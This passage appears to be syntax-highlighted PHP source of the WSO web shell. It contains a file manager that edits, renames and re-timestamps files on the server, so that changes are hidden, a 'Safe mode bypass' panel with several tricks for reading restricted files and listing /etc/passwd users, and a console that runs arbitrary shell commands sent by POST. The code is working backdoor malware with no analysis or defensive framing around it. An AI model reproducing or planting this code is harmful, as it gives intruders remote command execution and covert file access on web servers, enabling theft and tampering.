            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=chmod value=&quot;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%o&#39;</span><span class="p">,</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])),</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">&#39;File isn\&#39;t writeable&#39;</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$time</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
                <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="mi">1</span><span class="p">);</span>
                <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                    <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
                    <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="s1">&#39;Saved!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,\&#39;1\&#39;+this.text.value);return false;&quot;&amp;gt;&amp;lt;textarea name=text class=bigarea&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span>
                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;hexdump&#39;</span><span class="o">:</span>
            <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
            <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;00000000&amp;lt;br&amp;gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
            <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$len</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
                <span class="k">switch</span> <span class="p">(</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="mi">10</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">default</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%08X&#39;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;}</span>
                    <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=#333333&amp;gt;&amp;lt;span style=&quot;font-weight: normal;&quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#282828&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#333333&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;rename&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span>
                    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t rename!&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&amp;lt;script&amp;gt;g(null,null,&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;,null,&quot;&quot;)&amp;lt;/script&amp;gt;&#39;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=name value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;touch&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">))</span>
                        <span class="k">echo</span> <span class="s1">&#39;Fail!&#39;</span><span class="p">;</span>
                    <span class="k">else</span>
                        <span class="k">echo</span> <span class="s1">&#39;Touched!&#39;</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Bad time format!&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nb">clearstatcache</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=touch value=&quot;&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionSafeMode</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$temp</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nb">ob_start</span><span class="p">();</span>
    <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
            <span class="nv">$temp</span><span class="o">=@</span><span class="nb">tempnam</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span> <span class="s1">&#39;cx&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="s2">&quot;compress.zlib://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="nv">$temp</span><span class="p">)){</span>
                <span class="k">echo</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
                <span class="nb">unlink</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span>
                <span class="k">echo</span> <span class="s1">&#39;Sorry... Can\&#39;t open file&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
            <span class="nv">$files</span> <span class="o">=</span> <span class="nb">glob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$files</span><span class="p">)</span> <span class="p">)</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span>
                    <span class="k">echo</span> <span class="nv">$filename</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
            <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="s2">&quot;file://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">));</span>
            <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
            <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">);</span>
            <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span>
            <span class="k">include</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
            <span class="k">for</span><span class="p">(;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span>
                    <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Safe mode bypass&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Copy (read file)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;1&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Glob (list dir)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;2&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Curl (read file)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;3&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Ini_restore (read file)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;4&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Posix_getpwuid (&quot;Read&quot; /etc/passwd)&amp;lt;/span&amp;gt;&amp;lt;table&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;5&quot;,this.param1.value,this.param2.value);return false;\&#39;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;From&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=param1 value=0&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;To&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=param2 value=1000&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=&quot;ml1&quot; style=&quot;margin-top:5px&quot; id=&quot;Output&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionConsole</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">echo</span> <span class="s2">&quot;document.cf.cmd.value=&#39;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">iconv</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">],</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;!.*cd\s+([^;]+)$!&quot;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$match</span><span class="p">))</span>  <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
                <span class="k">echo</span> <span class="s2">&quot;document.mf.c.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;document.cf.output.value+=&#39;&quot;</span><span class="o">.</span><span class="nv">$temp</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;document.cf.output.scrollTop = document.cf.output.scrollHeight;&quot;</span><span class="p">;</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
        <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt; </span>
<span class="s2">if(window.Event) window.captureEvents(Event.KEYDOWN);</span>
<span class="s2">var cmds = new Array(&#39;&#39;);</span>
<span class="s2">var cur = 0;</span>
<span class="s2">function kp(e) {</span>
<span class="s2">   var n = (window.Event) ? e.which : e.keyCode;</span>
<span class="s2">   if(n == 38) {</span>
<span class="s2">       cur--;</span>
<span class="s2">       if(cur&amp;gt;=0)</span>
<span class="s2">           document.cf.cmd.value = cmds[cur];</span>
<span class="s2">       else</span>
<span class="s2">           cur++;</span>
<span class="s2">   } else if(n == 40) {</span>
<span class="s2">       cur++;</span>
<span class="s2">       if(cur &amp;lt; cmds.length)</span>
<span class="s2">           document.cf.cmd.value = cmds[cur];</span>
<span class="s2">       else</span>
<span class="s2">           cur--;</span>
<span class="s2">   }</span>
<span class="s2">}</span>
<span class="s2">function add(cmd) {</span>
<span class="s2">   cmds.pop();</span>
<span class="s2">   cmds.push(cmd);</span>
<span class="s2">   cmds.push(&#39;&#39;);</span>
<span class="s2">   cur = cmds.length-1;</span>
<span class="s2">}</span>
<span class="s2">&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Console&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;form name=cf onsubmit=&quot;if(document.cf.cmd.value==\&#39;clear\&#39;){document.cf.output.value=\&#39;\&#39;;document.cf.cmd.value=\&#39;\&#39;;return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;&quot;&amp;gt;&amp;lt;select name=alias&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;aliases&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;optgroup label=&quot;-&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$n</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;-&quot;&amp;gt;&amp;lt;/optgroup&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
